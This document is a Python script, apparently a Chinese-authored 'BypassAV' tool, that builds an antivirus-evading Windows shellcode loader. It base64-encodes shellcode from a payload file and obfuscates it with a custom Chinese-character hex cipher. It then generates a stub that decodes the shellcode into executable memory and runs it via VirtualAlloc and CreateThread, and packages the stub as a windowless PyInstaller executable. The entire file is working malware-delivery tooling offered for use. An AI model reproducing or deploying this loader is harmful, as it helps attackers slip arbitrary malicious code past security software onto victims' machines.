# -*- coding: UTF-8 -*-
# @Time:  15:24
# @Author: 浪飒
# @File: BypassAV-浪飒.py
# @Software: PyCharm
import base64
import os
import shutil

import PyInstaller.__main__

en_Langsa = {
    '0': '浪浪浪浪',
    '1': '浪浪浪飒',
    '2': '浪浪飒浪',
    '3': '浪浪飒飒',
    '4': '浪飒浪浪',
    '5': '浪飒浪飒',
    '6': '浪飒飒浪',
    '7': '浪飒飒飒',
    '8': '飒浪浪浪',
    '9': '飒浪浪飒',
    'a': '飒浪飒浪',
    'b': '飒浪飒飒',
    'c': '飒飒浪浪',
    'd': '飒飒浪飒',
    'e': '飒飒飒浪',
    'f': '飒飒飒飒'
}


# 浪飒进制编码
def encode_Langsa(text):
    # 将字符串转换为16进制（字符串可含汉字）
    text16 = text.encode("utf-8").hex()
    for i in en_Langsa:
        text16 = text16.replace(i, en_Langsa[i])
    encode_text = text16
    return encode_text


def en_bs64():
    shellcode = open('payload.py')
    shellcode = shellcode.read()
    # 取出shellcode内容
    s1 = shellcode.find("\"") + 1
    s2 = shellcode.rfind("\"")
    shellcode = shellcode[s1:s2]
    shellcode = str(base64.b64encode(shellcode.encode('UTF-8')), 'UTF-8')
    return shellcode


if __name__ == '__main__':
    file = open('cache.py', 'w', encoding="utf-8")
    file.write("""
# -*- coding: UTF-8 -*-
# @Time:  14:16
# @Author: 浪飒
# @File: 浪飒bypassAV.py
# @Software: PyCharm

# 浪飒进制解码
import binascii
import ctypes
de_Langsa = {
    '浪浪浪浪': '0',
    '浪浪浪飒': '1',
    '浪浪飒浪': '2',
    '浪浪飒飒': '3',
    '浪飒浪浪': '4',
    '浪飒浪飒': '5',
    '浪飒飒浪': '6',
    '浪飒飒飒': '7',
    '飒浪浪浪': '8',
    '飒浪浪飒': '9',
    '飒浪飒浪': 'a',
    '飒浪飒飒': 'b',
    '飒飒浪浪': 'c',
    '飒飒浪飒': 'd',
    '飒飒飒浪': 'e',
    '飒飒飒飒': 'f'
}

def decode_Langsa(text):
    text16=''
    for i in range(0, len(text), 4):
        text16 = text16 + de_Langsa[text[i:i + 4]]
    decode_text = binascii.a2b_hex(text16).decode()
    return decode_text
    
浪飒=\"""" + encode_Langsa("""
import base64
import binascii
import codecs
import ctypes

de_Langsa = {
    '浪浪浪浪': '0',
    '浪浪浪飒': '1',
    '浪浪飒浪': '2',
    '浪浪飒飒': '3',
    '浪飒浪浪': '4',
    '浪飒浪飒': '5',
    '浪飒飒浪': '6',
    '浪飒飒飒': '7',
    '飒浪浪浪': '8',
    '飒浪浪飒': '9',
    '飒浪飒浪': 'a',
    '飒浪飒飒': 'b',
    '飒飒浪浪': 'c',
    '飒飒浪飒': 'd',
    '飒飒飒浪': 'e',
    '飒飒飒飒': 'f'
}


def de_bs64(shellcode):
    shellcode = base64.b64decode(shellcode)
    shellcode = codecs.escape_decode(shellcode)[0]
    return shellcode


# 浪飒进制解码
def decode_Langsa(text):
    text16 = ''
    for i in range(0, len(text), 4):
        text16 = text16 + de_Langsa[text[i:i + 4]]
    decode_text = binascii.a2b_hex(text16).decode()
    return decode_text


def run(shellcode):
    shellcode = bytearray(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
""" + 'langsa=\"' + encode_Langsa(en_bs64()) + '\"' +
                         """
run(de_bs64(decode_Langsa(langsa)))
""") + '\"' + """
if __name__ == '__main__':
    exec(decode_Langsa(浪飒)) """)
    file.close()
    print("我正在生成exe，你别急")
    try:
        # 获取要打包的脚本路径
        script_file = "cache.py"
        # 获取 PyInstaller 路径
        pyinstaller_path = os.path.dirname(PyInstaller.__main__.__file__)
        # 设置打包选项
        build_args = [
            "--onefile",  # 生成一个单独的可执行文件
            "--noconsole",  # 不显示命令行窗口
            "--name=BypassAV-浪飒",  # 设置生成的可执行文件名
            "-i=favicon.ico",  # 加载平台鼠标纸牌图标
            script_file  # 添加要打包的脚本路径
        ]
        # 执行打包命令
        PyInstaller.__main__.run(build_args)
    except:
        print("快看下exe打包好了没,在dist文件夹下")
    # 删除 build 文件夹和.spec文件
    shutil.rmtree("./build")
    os.remove("./BypassAV-浪飒.spec")
    os.remove("./cache.py")
